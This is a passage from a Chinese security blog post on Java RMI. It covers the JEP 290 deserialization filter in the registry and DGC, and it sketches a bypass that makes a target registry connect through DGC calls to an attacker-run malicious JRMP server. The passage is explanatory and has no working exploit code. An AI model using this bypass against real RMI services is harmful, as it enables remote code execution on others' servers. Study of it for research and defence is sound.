<li>The filter mechanism must not require subclassing or modification to existing subclasses of ObjectInputStream. [定义一个可配置的过滤机制，比如可以通过配置 properties文件的形式来定义过滤器]</li>
</ul>
<p>dgc调用栈如下图。</p>
<p><img src="/../images/image-20230823170619020.png" alt="image-20230823170619020"></p>
<p>进入源码查看可以发现只允许<code>return String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</code>这些反序列化，我们构造的恶意类自然不能成功。<img src="/../images/image-20230823195747370.png" alt="image-20230823195747370"></p>
<p>下面的是注册中心的反序列化的调用链，当我们传入的是恶意类时会对系列化进行过滤。从而抛出异常。</p>
<p><img src="/../images/image-20230823200535800.png" alt="image-20230823200535800"></p>
<p><img src="/../images/image-20230823200751808.png" alt="image-20230823200751808"></p>
<p>这里我们说完了原理，然后我们来讲一下这么绕过。</p>
<p>因为在RegistryImpl&#x2F;DGCImpl加了过滤就不能在利用他们里面的反序列化了。可是我们在之前在攻击JRMP客户端那一节里提到过<code>StreamRemoteCall#executeCall</code>。这个相对更底层一点，和具体的Stub&#x2F;Skel类没有关系，调用的地方更多。</p>
<p>好了现在思路就变成了如果我们让注册中心创建一个stub并且连接我们的恶意jrmp服务，不就实现了对注册中心的攻击。现在注册中心已经跑起来了，我们知道StreamRemoteCall#execute函数只在UnicastRef里面的两个invoke调用了。现在找哪里调用invoke这个方法。这里直接其实是有三个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、RegistryImpl_Stub中的list/lookup/bind/rebind/unbind方法</span><br><span class="line">2、RemoteObjectInvocationHandler#invokeRemoteMethod</span><br><span class="line">3、DGCImpl_Stub中的dirty/clean</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们直接说结论，是DGCImpl_Stub中的dirty&#x2F;clean，在往上找在DGCClient$EndPointEntry#makeDirtyCall调用了dirty<img src="/../images/image-20230823212616409.png" alt="image-20230823212616409"></p>
<p>之后在run方法里调用了makeDirtyCall<img src="/../images/image-20230823213616740.png" alt="image-20230823213616740"></p>
<p>然后看这个线程的创建RenewCleanThread</p>
<p><img src="/../images/image-20230823213735691.png" alt="image-20230823213735691"></p>
<p>发现流程都是通的，创建一个stub后开启一个线程去执行invoke。然后我们继续向上找。EndpointEntry在哪里调用。</p>
<p>发现在look里面调用。</p>
<p><img src="/../images/image-20230823214320201.png" alt="image-20230823214320201">不写了头大，核心原理就是当客户端主动连上一个恶意的注册中心时，它是不受 JEP290 保护的，所以我们创建一个恶意中心，等着被攻击的注册中去链接。总体流程还是按照dgc的流程去走的，中间会经过一个判断，判断是否为空（只有这一个判断，其他都是很流畅的创建stub和invoke发送)。现在关键的让我又变成了让其不为空，调试发现在反序列化的过程中会触发赋值，好了，现在只需要找一个在白名单里能正常反序列化的类就可以了（这里之前忽视了一点，是可以反序列化的，但是不能反序列化恶意类，而白名单里的是可以反序列化的，所以我们才可以控制连接的IP和端口)。攻击流程是向注册中心发送存在恶意注册中心地址端口的类，就会触发让被攻击注册中心访问恶意注册中心。攻击成功</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">5LHBr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/07/30/%E5%85%B3%E4%BA%8ERmi/">http://example.com/2023/07/30/%E5%85%B3%E4%BA%8ERmi/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://5lhbr.github.io/images/20230730161128.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/" title="关于JNDI"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">关于JNDI</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/26/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://5lhbr.github.io/images/20230730161128.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">5LHBr</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AFrmi"><span class="toc-number">1.</span> <span class="toc-text">1、什么是rmi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1%E3%80%81%E5%85%88%E5%86%99%E4%B8%80%E4%B8%AAdemo%E6%9D%A5%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E6%95%B4%E4%B8%AA%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">1.1、先写一个demo来简单了解一下整个流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">2、源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C"><span class="toc-number">2.1.</span> <span class="toc-text">2.1.服务注册</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0-%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="toc-number">2.1.1.</span> <span class="toc-text">① 远程对象创建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="toc-number">2.1.2.</span> <span class="toc-text">②远程对象创建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A2%E7%BB%91%E5%AE%9A%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%B0%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">2.1.3.</span> <span class="toc-text">③绑定远程对象到注册中心</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">2.2、客户端获取远程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.获取注册中心远程对象</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3%E3%80%81%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%AB%AF"><span class="toc-number">2.3.</span> <span class="toc-text">2.3、获取注册中心远程对象(注册中心端)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.4.</span> <span class="toc-text">2.4、远程方法调用(客户端)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">2.5、远程方法调用（服务端）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">3、攻击实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">3.1.</span> <span class="toc-text">3.1、客户端&#x2F;服务端攻击注册中心</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">3.2.</span> <span class="toc-text">3.2、注册中心攻击客户端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">3.3.</span> <span class="toc-text">3.3、客户端攻击服务端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-4%E3%80%81DGC%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">3.4.</span> <span class="toc-text">3.4、DGC相关的攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-5%E6%94%BB%E5%87%BBJRMP%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">3.5.</span> <span class="toc-text">3.5攻击JRMP客户端</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E4%B8%8B%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">4、高版本 JDK 下的绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/24/%E5%85%B3%E4%BA%8EJNDI/" title="关于JNDI">关于JNDI</a><time datetime="2023-08-24T07:11:14.000Z" title="Created 2023-08-24 15:11:14">2023-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/30/%E5%85%B3%E4%BA%8ERmi/" title="关于Rmi">关于Rmi</a><time datetime="2023-07-30T08:55:50.000Z" title="Created 2023-07-30 16:55:50">2023-07-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/26/hello-world/" title="Hello World">Hello World</a><time datetime="2023-07-26T14:04:50.693Z" title="Created 2023-07-26 22:04:50">2023-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/0202/03/26/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" title="java 反序列化">java 反序列化</a><time datetime="0202-03-26T14:48:12.000Z" title="Created 0202-03-26 22:24:54">0202-03-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 5LHBr</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>